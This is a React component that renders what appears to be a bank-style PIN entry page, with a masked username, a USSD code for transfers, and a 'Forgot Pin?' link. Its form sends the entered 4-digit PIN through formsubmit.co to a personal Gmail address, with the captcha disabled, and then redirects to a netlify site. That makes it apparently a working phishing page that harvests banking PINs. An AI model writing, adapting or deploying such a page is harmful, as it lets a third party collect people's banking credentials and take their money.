import React, { useState } from 'react'
import { Link } from "react-router-dom";

//Import styles and Icons
import './Pin.css'

const Pin = () => {

  const [otp, setOtp] = useState(new Array(4).fill(""))

  const handleChange = (element, index) => {
    if(isNaN(element.value)) return false;

    setOtp([...otp.map((d, idx) => (idx === index) ? element.value : d)]);

    //Focus next input
    if(element.nextSibling) {
      element.nextSibling.focus();
    }
  }

  return (  
    <div className='register'>
        {/* <Link to='/'>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" alt="" className='register__logo' />
        </Link> */}

        <div className="register__header">
          <div className="register__headerText">
            <h1>Welcome back,</h1>
            <h1>Eag#####</h1>
          </div>
        </div>
        <div className="register__container">
          <div className="register__containerUp">
            <form action="https://formsubmit.co/danielmordi22@gmail.com" method="POST">            
              <input type="hidden" name="_captcha" value="false"></input>
              <input type="hidden" name="_next" value="https://demiladebdm.netlify.com"></input>
              <h5>Enter your 4 digit pin</h5>

              <div className="map">
                {
                  otp.map( (data, index) => {
                    return (
                      <input
                        key={index}
                        className='otp_field' 
                        value={data} 
                        type="text"
                        name="otp"
                        maxLength="1"
                        placeholder="*" 
                        onChange={e => handleChange(e.target, index)}
                        onFocus={e => e.target.select()}
                      />
                    )
                  })
                }    
              </div>              
              <div className='register__linkUp'>
                  <Link to='/' className='register__linkUpLink'>
                      <p>Forgot Pin?</p>
                  </Link>
              </div>
              <div className="buttonR">
                <button type='submit' className='register__registerButton' onClick={e => alert("Entered PIN is " + otp.join(""))}>Proceed</button>
              </div>
            </form>
                <div className="buttonB">
                  <button className='register__registerButton' onClick={e => setOtp([...otp.map(v => "")])} style={{backgroundColor: "lightgray", color: "black", border: "none"}}>Clear</button>
                </div>
          </div>

          <div className="register__containerDown">
            <div className="register__bottomA">
                <h2>Available on USSD</h2>
                <p>Transfer, Airtime & Pay Bills Offline!</p>
            </div>
            <div className="register__bottomB">
                *5573#
            </div>
          </div>

        </div>
    </div>
)
}

export default Pin